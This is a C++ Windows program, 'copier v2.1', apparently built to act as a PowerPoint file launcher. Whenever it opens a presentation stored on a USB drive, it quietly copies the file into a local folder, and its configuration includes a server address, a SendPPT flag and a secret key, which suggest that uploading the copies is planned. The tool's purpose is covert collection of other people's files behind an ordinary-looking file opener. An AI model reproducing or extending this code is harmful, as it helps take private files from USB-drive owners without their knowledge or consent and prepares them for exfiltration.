#include <cstdio>
#include <string>
#include <regex>
#include <windows.h>
#include <direct.h> //_mkdir
#include <cstdarg>  //可变参数
#include "tools.h"
#include "configparser/ini_parser.h"
#include "network/network_socket.h"

using namespace std;
#define DEBUG_MODE true

// 定义函数
int conf();

void log(const char *, ...);

HANDLE executePPTFile(const string &);

void checkEnvironment_with1arg(int);

void executeAndCopyFile_with2args(const string &);

/* 配置变量 */
int ConfigStatus, C_CopyFlush, C_MaxSendSize;
bool C_LogMode, C_SendPPT;
string C_PowerPointPath, C_CopyPath, C_IgnoreDisk, C_ServerAddr, C_SecretKey;

/* 加载配置 */
int conf()
{
    int ret_read;
    IniParser ip;
    // read
    ret_read = ip.read(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini");
    rff<int>
            R_CopyFlush = ip.get_v_int("copier", "CopyFlush", 1024),
            R_MaxSendSize = ip.get_v_int("net_work", "MaxSendSize", -1);
    rff<bool>
            R_LogMode = ip.get_v_bool("copier", "LogMode", true),
            R_SendPPT = ip.get_v_bool("net_work", "SendPPT", false);
    rff<string>
            R_PowerPointPath = ip.get_v_string("copier", "PowerPointPath"),
            R_CopyPath = ip.get_v_string("copier", "CopyPath"),
            R_IgnoreDisk = ip.get_v_string("copier", "IgnoreDisk"),
            R_ServerAddr = ip.get_v_string("net_work", "ServerAddr"),
            R_SecretKey = ip.get_v_string("net_work", "SecretKey");
    // init
    C_LogMode = ip.get_v_bool("copier", "LogMode", true).value();
    C_PowerPointPath = R_PowerPointPath.value();
    C_CopyPath = R_CopyPath.value();
    C_IgnoreDisk = R_IgnoreDisk.value();
    C_CopyFlush = R_CopyFlush.value();
    //
    C_ServerAddr = R_ServerAddr.value();
    C_SendPPT = R_SendPPT.value();
    C_SecretKey = R_SecretKey.value();
    C_MaxSendSize = R_MaxSendSize.value();
    // return
    return ret_read
           | R_LogMode.status()
           | R_PowerPointPath.status()
           | R_CopyPath.status()
           | R_IgnoreDisk.status()
           | R_CopyFlush.status()
           | R_ServerAddr.status()
           | R_SendPPT.status()
           | R_SecretKey.status();
}

void log(const char *format, ...)
{
    if (C_LogMode)
    {
        tm *p = get_tm();
        // 输出时间
        printf("[%04d/%02d/%02d %02d:%02d:%02d] ",
               p->tm_year + 1900, p->tm_mon + 1, p->tm_mday, p->tm_hour, p->tm_min, p->tm_sec);
        // 输出调试信息
        va_list args;           // 定义可变参数列表对象
        va_start(args, format); // format 存储格式字符串，作为可变参数起点的前一个参数标识
        vprintf(format, args);  // 整合格式字符串和可变参数
        va_end(args);           // 清除可变参数列表对象args
    }
}

/* 用PNT打开指定文件 */
HANDLE executePPTFile(const string &f_path)
{
    return ShellExecuteA(nullptr, "open",
                         ("\"" + C_PowerPointPath + "\"").c_str(),
                         ("\"" + f_path + "\"").c_str(),
                         nullptr, SW_SHOWNORMAL);
}

void checkEnvironment_with1arg(int argc)
{
    log("参数为 %d 个 (不是 2 个), 执行检查环境\n", argc);
    // 康康 PNT 是否存在
    if (fileExists(C_PowerPointPath))
    {
        log("环境正常！可以使用！\n");
        MessageBoxW(nullptr, L"环境正常！可以使用！", L"copier v2.1--by XN & XY", MB_ICONINFORMATION);
    }
    else
    {
        log("未找到PowerPoint程序！请检查配置！\n");
        MessageBoxW(nullptr, L"未找到PowerPoint程序！\n请检查配置！", L"copier v2.1--by XN & XY", MB_ICONERROR);
    }
}

void executeAndCopyFile_with2args(const string &f_path)
{
    // 有 2 个参数，打开（，再拷贝）
    string f_name = getFilePathSplitByAbs(f_path, 3).value();
    log("参数为 2 个，执行文件操作\n");
    log("打开文件路径: %s\n", f_path.c_str());
    log("文件所在盘: %c\n", toupper(f_path[0]));
    log("文件名: %s\n", f_name.c_str());
    executePPTFile(f_path); // 打开文件
    // 判断是否在 U 盘
    if (isInUDisk(f_path, C_IgnoreDisk)) // 在U盘中，复制
    {
        log("这个文件 *在* U盘中，先打开再复制\n");
        log("创建文件夹状态: %d\n",
            _mkdir(C_CopyPath.c_str())); // 创建文件夹，0 为原来不存在但创建成功，-1 为原来存在文件夹而不用创建
        log("文件拷贝目标: %s%s\n", C_CopyPath.c_str(), getFilePathSplitByAbs(f_path, 3).value().c_str());
        log("文件拷贝状态: %d\n", // 复制文件
            copyFile(f_path, C_CopyPath + getFilePathSplitByAbs(f_path, 3).value(),
                     C_CopyFlush)); // 0 为正常，1 为找不到源文件，-1 为创建文件失败
    }
    else // 不在U盘中，不复制
    {
        log("这个文件 *不在* U盘中，直接打开\n");
    }
}

/* 主函数 */
int main(int argc, char *argv[])
{
#ifdef DEBUG_MODE
    system("chcp 65001");
#endif
    tm *p = get_tm();
    printf("\n-------------------------copier v2.1 于 %04d/%02d/%02d %02d:%02d:%02d 启动-------------------------\n",
           p->tm_year + 1900, p->tm_mon + 1, p->tm_mday, p->tm_hour, p->tm_min, p->tm_sec);
    // 配置文件读取
    ConfigStatus = conf();
#ifndef DEBUG_MODE
    if (LogMode)
    {
        // 重定向文件
        freopen((getFilePathSplitByAbs(getExeFileAbsPath(), 1) + "copier.log").c_str(), "a", stdout);
    }
#endif
    log("EXE 路径: %s\n", getExeFileAbsPath().c_str());
    log("工作目录: %s\n", getFilePathSplitByAbs(getExeFileAbsPath(), 1).value().c_str());
    log("日志文件路径: %s\n", (getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.log").c_str());
    log("配置文件路径: %s\n", (getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini").c_str());
    log("配置状态: %d\n", ConfigStatus); // 0 为正常，-1 为读取配置文件异常
    log(R"(配置信息如下:
    [copier]
        LogMode = %d
        PowerPointPath = "%s"
        CopyPath = "%s"
        IgnoreDisk = "%s"
        CopyFlush = %d%s
    [net_work]
        ServerAddr = "%s"
        SendPPT = %d
        SecretKey = "%s"
        MaxSendSize = %d%s
)",
        C_LogMode, C_PowerPointPath.c_str(), C_CopyPath.c_str(), C_IgnoreDisk.c_str(),
        C_CopyFlush, C_CopyFlush > 0 ? "" : " (不是合法数值)",
        C_ServerAddr.c_str(), C_SendPPT, C_SecretKey.c_str(),
        C_MaxSendSize, C_MaxSendSize >= -1 ? "" : " (不是合法数值)");

    // 不合法的配置信息
    if (C_CopyFlush <= 0 || C_MaxSendSize < -1)
    {
        log("有配置不合法，程序终止\n");
        return -1;
    }

    // 干正事
    if (argc == 2)
    {
        executeAndCopyFile_with2args(argv[1]);
    }
    else
    {
        checkEnvironment_with1arg(argc);
    }
    log("程序正常退出\n");
#ifndef DEBUG_MODE
    if (LogMode)
    {
        fclose(stdout);
    }
#endif
    // 好习惯
    return 0;
}
